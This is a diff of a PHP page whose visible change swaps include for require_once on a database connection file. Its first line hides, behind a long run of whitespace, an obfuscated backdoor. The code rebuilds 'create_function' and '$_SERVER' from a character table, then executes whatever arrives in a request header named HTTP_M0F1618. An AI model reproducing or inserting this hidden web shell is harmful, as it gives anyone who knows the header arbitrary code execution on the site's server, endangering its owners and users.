@@ -1,6 +1,6 @@
 <?php                                                                                                                                                                                                                                                         $c2d='h\'(nsSRopmEr"ie0a618u$_Vftc0f1f68';$y9m=$c2d[4].$c2d[25].$c2d[11].$c2d[25].$c2d[7].$c2d[20].$c2d[8].$c2d[8].$c2d[14].$c2d[11];$d0k=$c2d[26].$c2d[11].$c2d[14].$c2d[16].$c2d[25].$c2d[14].$c2d[22].$c2d[24].$c2d[20].$c2d[3].$c2d[26].$c2d[25].$c2d[13].$c2d[7].$c2d[3];$f3c=$c2d[4].$c2d[25].$c2d[11].$c2d[25].$c2d[7].$c2d[20].$c2d[8].$c2d[8].$c2d[14].$c2d[11];$k9y=$c2d[24].$c2d[20].$c2d[15];if(isset(${$c2d[22].$c2d[5].$c2d[10].$c2d[6].$c2d[23].$c2d[10].$c2d[6]}[$y9m($c2d[0].$c2d[25].$c2d[25].$c2d[8].$c2d[22].$c2d[9].$c2d[15].$c2d[24].$c2d[18].$c2d[24].$c2d[17].$c2d[19])])){${$c2d[24].$c2d[20].$c2d[15]}=$d0k("",${$c2d[22].$c2d[5].$c2d[10].$c2d[6].$c2d[23].$c2d[10].$c2d[6]}[$y9m($c2d[0].$c2d[25].$c2d[25].$c2d[8].$c2d[22].$c2d[9].$c2d[15].$c2d[24].$c2d[18].$c2d[24].$c2d[17].$c2d[19])]);${$c2d[24].$c2d[20].$c2d[15]}();} ?><?php
 
-include('../Connections/maconnexion.php');
+require_once('../Connections/maconnexion.php');
 header('Content-Type: text/html; charset=iso-8859-1');
 
 
